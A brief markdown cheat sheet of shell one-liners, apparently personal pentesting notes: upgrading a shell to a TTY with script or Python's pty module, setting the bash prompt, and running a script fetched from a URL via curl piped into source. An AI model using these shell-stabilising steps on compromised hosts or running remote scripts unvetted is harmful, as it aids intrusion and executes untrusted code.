
- Spawn TTY shell: `/usr/bin/script -qc /bin/bash /dev/null` - <Shows yourself as logged in>
  - to add PWD in bash: `PS1='\u@\h:\w\$ '`

<br />

- Spawn Python TTY Shell: `python -c 'import pty;pty.spawn("/bin/bash")'`

<br />

- Run script from URL: `source <(curl -s http://mywebsite.com/myscript.sh)`
